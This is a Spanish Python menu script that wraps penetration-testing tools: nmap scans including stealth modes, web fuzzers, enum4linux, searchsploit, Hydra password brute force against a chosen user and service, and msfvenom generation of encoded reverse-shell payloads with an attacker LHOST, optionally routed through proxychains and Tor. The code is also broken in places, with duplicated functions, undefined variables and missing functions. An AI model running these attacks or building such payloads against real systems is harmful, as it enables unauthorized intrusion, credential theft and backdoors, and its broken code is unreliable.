import re
import subprocess
import time
import os

def validar_objetivo(objetivo):
    ip_regex = r"^\d{1,3}(\.\d{1,3}){3}$"
    dominio_regex = r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"
    ipv6_regex = r"^([0-9a-fA-F:]+)$"
    if re.match(ip_regex, objetivo) or re.match(dominio_regex, objetivo) or re.match(ipv6_regex, objetivo):
        return True
    return False

def ejecutar_comando(comando):
    global usar_proxychains
    if usar_proxychains:
        comando = ["proxychains"] + comando
    print(f"\nEjecutando: {' '.join(comando)}")
    inicio = time.time()
    try:
        subprocess.run(comando, check=True)
        print(f"Escaneo completado en {round(time.time() - inicio, 2)} segundos.")
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Nmap: {e}")
    except FileNotFoundError:
        print("Nmap no está instalado o no se encuentra en el PATH.")

def escaneo_basico(target, min_rate, extra="", puertos="", formato="txt"):
    salida = "nmap_result." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "--open", "--min-rate", str(min_rate),
        "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if puertos:
        comando.insert(1, "-p")
        comando.insert(2, puertos)
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_servicios(target, extra="", formato="txt"):
    salida = "nmap_servicios." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sV", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_os(target, extra="", formato="txt"):
    salida = "nmap_os." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-O", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_servicios_C(target, extra="", formato="txt"):
    salida = "nmap_svC." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sV", "--script=default", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_agresivo(target, extra="", formato="txt"):
    salida = "nmap_agresivo." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-A", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_syn(target, extra="", formato="txt"):
    salida = "nmap_syn." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sS", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_sigiloso(target, nivel, extra="", formato="txt"):
    salida = f"nmap_sigiloso_T{nivel}." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sS", "-T" + str(nivel), "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_ipv6(target, extra="", formato="txt"):
    salida = "nmap_ipv6." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-6", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_nse_personalizado(target, script_nse, extra="", formato="txt"):
    salida = f"nmap_{script_nse}." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "--script", script_nse, "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_arp(target, extra="", formato="txt"):
    salida = "nmap_arp." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-PR", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_udp(target, extra="", formato="txt"):
    salida = "nmap_udp." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sU", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_syn(target, extra=""):
    comando = [
        "nmap", "-sS", "-Pn", "-n", "-vvv", target, "-oN", "nmap_syn.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_sigiloso(target, nivel, extra=""):
    comando = [
        "nmap", "-sS", "-T" + str(nivel), "-Pn", "-n", "-vvv", target, "-oN", f"nmap_sigiloso_T{nivel}.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_ipv6(target, extra=""):
    comando = [
        "nmap", "-6", "-Pn", "-n", "-vvv", target, "-oN", "nmap_ipv6.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_nse_vuln(target, extra=""):
    comando = [
        "nmap", "--script", "vuln", "-Pn", "-n", "-vvv", target, "-oN", "nmap_vuln.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_arp(target, extra=""):
    comando = [
        "nmap", "-PR", "-n", "-vvv", target, "-oN", "nmap_arp.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def mostrar_resumen_servicios(archivo_resultado):
    print("\nResumen de servicios encontrados:")
    try:
        with open(archivo_resultado, "r") as f:
            for linea in f:
                if re.match(r"^\d+/tcp\s+open", linea) or re.match(r"^\d+/udp\s+open", linea):
                    print(linea.strip())
    except FileNotFoundError:
        print(f"No se encontró el archivo de resultados: {archivo_resultado}")




def escaneo_nmap_msf(target, extra=""):
    print("Función escaneo_nmap_msf aún no implementada.")

# Elimina la función escaneo_arp duplicada y deja solo una versión.
# Elimina el segundo print en ayuda_android y deja solo uno.

def ayuda_android():
    print("""
Para usar Nmap en Android (Termux):
1. Instala Termux desde Google Play o F-Droid.
2. Instala Nmap con: pkg install nmap
3. Ejecuta los mismos comandos que en Linux.
Ejemplo: nmap -sV 192.168.1.1
""")


def escaneo_dirsearch(target, extra=""):
    comando = ["dirsearch", "-u", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_hydra(target, servicio, usuario, diccionario, hilos):
    comando = [
        "hydra", "-l", usuario, "-P", diccionario, "-t", str(hilos), target, servicio
    ]
    ejecutar_comando(comando)


def escaneo_gobuster(target, wordlist, ext, threads):
    comando = [
        "gobuster", "dir", "-u", target, "-w", wordlist, "-t", str(threads)
    ]
    if ext:
        comando += ["-x", ext]
    ejecutar_comando(comando)

def escaneo_nessus(target):
    print(f"Lanza el escaneo de Nessus manualmente para el objetivo: {target}")
    print("Puedes automatizar esto usando la API REST de Nessus o el CLI cuando lo configures.")


def generar_payload_msfvenom():
    plataforma = input("Plataforma (windows, linux, android, osx, etc.): ").lower()
    tipo_payload = input("Tipo de payload (ejemplo: meterpreter/reverse_tcp): ")
    lhost = input("LHOST (IP atacante): ")
    lport = input("LPORT (puerto atacante): ")
    nombre = input("Nombre de archivo de salida (ejemplo: shell.exe, backdoor.apk): ")

    formato = ""
    if plataforma == "windows":
        formato = "exe"
    elif plataforma == "linux":
        formato = "elf"
    elif plataforma == "android":
        formato = "apk"
    elif plataforma in ["osx", "mac", "macos"]:
        formato = "macho"
    else:
        formato = input("Formato de archivo (ejemplo: exe, elf, apk, macho): ")

    usar_encoder = input("¿Quieres usar encoder? (s/n): ").lower() == "s"
    encoder = ""
    veces = ""
    badchars = ""
    if usar_encoder:
        encoder = input("Nombre del encoder (ejemplo: x86/shikata_ga_nai): ")
        veces = input("¿Cuántas veces aplicar el encoder? (ejemplo: 5): ")
        if not veces.isdigit() or int(veces) < 1:
            veces = "1"
        badchars = input("Badchars (caracteres a evitar, ejemplo: '\\x00\\x0a\\x0d') [deja vacío si no]: ")

    comando = [
        "msfvenom",
        "-p", f"{plataforma}/{tipo_payload}",
        "LHOST=" + lhost,
        "LPORT=" + lport,
        "-f", formato,
        "-o", nombre
    ]
    if usar_encoder:
        comando += ["-e", encoder, "-i", veces]
        if badchars:
            comando += ["-b", badchars]

    print(f"\nEjecutando: {' '.join(comando)}")
    try:
        subprocess.run(comando, check=True)
        print(f"Payload generado: {nombre}")
    except subprocess.CalledProcessError as e:
        print(f"Error al generar el payload: {e}")
def escaneo_nikto(target, extra=""):
    comando = ["nikto", "-h", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_whatweb(target, extra=""):
    comando = ["whatweb", target]
    if extra:
        comando += extra.split()
        ejecutar_comando(comando)
def escaneo_enum4linux(target, extra=""):
    comando = ["enum4linux", "-a", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_openvas(target, extra=""):
    print(f"Lanza el escaneo de OpenVAS manualmente para el objetivo: {target}")
    print("Puedes automatizar esto usando la API o el CLI de OpenVAS cuando lo configures.")
    if extra:
        print(f"Parámetros extra: {extra}")
def escaneo_wfuzz(target, wordlist, extra=""):
    comando = ["wfuzz", "-c", "-w", wordlist, target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_ffuf(target, wordlist, ext="", extra=""):
    comando = ["ffuf", "-u", f"{target}/FUZZ", "-w", wordlist]
    if ext:
        comando += ["-e", ext]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def validar_url_fuzz(url):
    return (url.startswith("http://") or url.startswith("https://")) and "FUZZ" in url
def escaneo_searchsploit(servicio):
    comando = ["searchsploit", servicio]
    ejecutar_comando(comando)
def mostrar_ayuda():
    print(""")
Opciones de escaneo con Nmap y herramientas relacionadas:
1. Escaneo básico (puertos, --open, --min-rate)                                                                                                                                                                                                                                    
2. Escaneo de servicios y versiones (-sV)
3. Detección de sistema operativo (-O)
4. Guardar resultado en XML
5. Guardar resultado en JSON
6. Escaneo de servicios con -sV --script=default
7. Escaneo agresivo (-A)
8. Escaneo SYN sigiloso (-sS)
9. Escaneos sigilosos con T1, T2, T3, T4
10. Escaneo IPv6
11. Escaneo de vulnerabilidades con NSE (--script vuln)
12. Escaneo ARP para MACs (-PR)
13. Ayuda para Nmap en Android
14. Escaneo Nmap y carga en Metasploit (db_import)
15. Escaneo de directorios con Dirsearch
16. Fuerza bruta con Hydra (FTP, SSH, MySQL)
17. Escaneo de directorios y archivos con Gobuster
18. Escaneo de vulnerabilidades con Nessus
19. Generar payloads con msfvenom (Windows, Linux, Android, Mac, etc.)
20. Escaneo con script MSE personalizado
21. Escaneo UDP (-sU)
22. Escaneo de vulnerabilidades web con Nikto
23. Detección de tecnologías con WhatWeb
24. Enumeración de servicios SMB con Enum4linux
25. Escaneo de vulnerabilidades con OpenVAS
26. Fuzzing de directorios y parametros web con Wfuzz (usa FUZZ en la URL)
27. Fuzzing de directorios y archivos web con FFUF
28. Busqueda de exploits locales con Searchsploit
h. Mostrar esta ayuda
""")
if __name__ == "__main__":
    usar_proxychains = input("¿Quieres usar proxychains y Tor para el escaneo? (s/n): ").lower() == "s"
    objetivo = input("Introduce la IP, dominio o IPv6 objetivo: ")
    if not validar_objetivo(objetivo):
        print("Objetivo inválido. Introduce una IP, dominio o IPv6 válido.")
        exit(1)

    mostrar_ayuda()
    opcion = input("Elige una opción (1-19, h para ayuda): ")
    extra = input("¿Quieres añadir parámetros extra a Nmap? (deja vacío si no): ")
    if extra.lower() in ["si", "no"]:
        extra = ""

if opcion == "1":
    # ...tu lógica...
    escaneo_basico(objetivo, min_rate, extra, puertos, formato)
    if formato == "txt":
        mostrar_resumen_servicios("nmap_result.txt")
elif opcion == "2":
    escaneo_servicios(objetivo, extra, formato)
    if formato == "txt":
        mostrar_resumen_servicios("nmap_servicios.txt")
elif opcion == "3":
    escaneo_os(objetivo, extra, formato)
    if formato == "txt":
        mostrar_resumen_servicios("nmap_os.txt")
# ...y así sucesivamente para las demás funciones de Nmap...
elif opcion == "4":
    escaneo_xml(objetivo, extra)
elif opcion == "5":
    escaneo_json(objetivo, extra)
elif opcion == "6":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_servicios_C(objetivo, extra, formato)
elif opcion == "7":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_agresivo(objetivo, extra, formato)
elif opcion == "8":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_syn(objetivo, extra, formato)
elif opcion == "9":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    for nivel in range(1, 5):
        escaneo_sigiloso(objetivo, nivel, extra, formato)
elif opcion == "10":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_ipv6(objetivo, extra, formato)
elif opcion == "11":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_nse_vuln(objetivo, extra, formato)
elif opcion == "12":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_arp(objetivo, extra, formato)
elif opcion == "13":
    ayuda_android()
elif opcion == "14":
    escaneo_nmap_msf(objetivo, extra)
elif opcion == "15":
    escaneo_dirsearch(objetivo, extra)
elif opcion == "16":
    servicio = input("Servicio a atacar (ejemplo: ftp, ssh, mysql, http, smb, rdp, telnet, vnc, etc.): ")
    usuario = input("Usuario objetivo: ")
    diccionario = input("Ruta al diccionario de contraseñas: ")
    hilos = input("Número de hilos (ejemplo: 4, 8, 16): ")
    if not hilos.isdigit() or int(hilos) < 1:
        hilos = "4"
    escaneo_hydra(objetivo, servicio, usuario, diccionario, hilos)
elif opcion == "17":
    wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ")
    ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
    threads = input("Número de hilos (ejemplo: 10, 20): ")
    if not threads.isdigit() or int(threads) < 1:
        threads = "10"
    escaneo_gobuster(objetivo, wordlist, ext, threads)
elif opcion == "18":
    escaneo_nessus(objetivo)
elif opcion == "19":
    generar_payload_msfvenom()

elif opcion == "20":
    script_nse = input("Nombre del script NSE a ejecutar (ejemplo: http-enum, ftp-anon, smb-os-discovery): ")
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_nse_personalizado(objetivo, script_nse, extra, formato)

elif opcion == "21":
    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
    if formato not in ["txt", "xml", "json"]:
        formato = "txt"
    escaneo_udp(objetivo, extra, formato)
    if formato == "txt":
        mostrar_resumen_servicios("nmap_udp.txt")
elif opcion.lower() == "h":
    mostrar_ayuda()
elif opcion == "22":
    escaneo_nikto(objetivo, extra)
elif opcion == "23":
    escaneo_whatweb(objetivo, extra)
elif opcion == "24":
    escaneo_enum4linux(objetivo, extra)
elif opcion == "25":
    escaneo_openvas(objetivo, extra)
elif opcion == "26":
    wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
    url_fuzz = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
    if not os.path.isfile(wordlist):
        print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
    elif not validar_url_fuzz(url_fuzz):
        print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
    else:
        escaneo_wfuzz(url_fuzz, wordlist, extra)

elif opcion == "27":
    wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
    url_ffuf = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
    ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
    if not os.path.isfile(wordlist):
        print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
    elif not validar_url_fuzz(url_ffuf):
        print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
    else:
        escaneo_ffuf(url_ffuf, wordlist, ext, extra)

elif opcion == "28":
    servicio = input("Servicio, versión o palabra clave a buscar en Searchsploit: ")
    escaneo_searchsploit(servicio)

else:
    print("Opción no válida.")